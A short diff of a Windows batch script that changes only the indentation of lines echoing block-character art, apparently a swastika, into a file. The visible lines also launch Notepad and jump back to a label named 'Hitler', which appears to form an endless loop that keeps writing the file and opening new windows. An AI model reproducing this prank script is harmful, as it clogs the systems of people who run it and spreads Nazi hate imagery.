@@ -21,12 +21,12 @@ REM Loops
     echo ▓▓░░░░░▄▄██▀░░░░░░░░▓▓ >> %FILENAME%
     echo ▓░░░░░▄██▀░░░▄█▄░░░░░▓ >> %FILENAME%
     echo ▌░░░░░▀██▄▄▄█████▄░░░▐ >> %FILENAME%
-      echo ░░▄▄▄░░░▀████▀░▀▀██▄░░ >> %FILENAME%
-      echo ░░▀██▄░▄▄████▄░░░▀▀▀░░ >> %FILENAME%
-      echo ▌░░░▀█████▀▀▀██▄░░░░░▐ >> %FILENAME%
-      echo ▓░░░░░▀█▀░░░▄██▀░░░░░▓ >> %FILENAME%
-      echo ▓▓░░░░░░░░▄██▀░░░░░░▓▓ >> %FILENAME%
-      echo ▓▓▓▄░░░░░▀█▀▀░░░░░▄▓▓▓ >> %FILENAME%
-      echo ▓▓▓▓▓▓▄▄░░░░░░▄▄▓▓▓▓▓▓ >> %FILENAME%
+    echo ░░▄▄▄░░░▀████▀░▀▀██▄░░ >> %FILENAME%
+    echo ░░▀██▄░▄▄████▄░░░▀▀▀░░ >> %FILENAME%
+    echo ▌░░░▀█████▀▀▀██▄░░░░░▐ >> %FILENAME%
+    echo ▓░░░░░▀█▀░░░▄██▀░░░░░▓ >> %FILENAME%
+    echo ▓▓░░░░░░░░▄██▀░░░░░░▓▓ >> %FILENAME%
+    echo ▓▓▓▄░░░░░▀█▀▀░░░░░▄▓▓▓ >> %FILENAME%
+    echo ▓▓▓▓▓▓▄▄░░░░░░▄▄▓▓▓▓▓▓ >> %FILENAME%
     start "" notepad.exe
     goto :Hitler
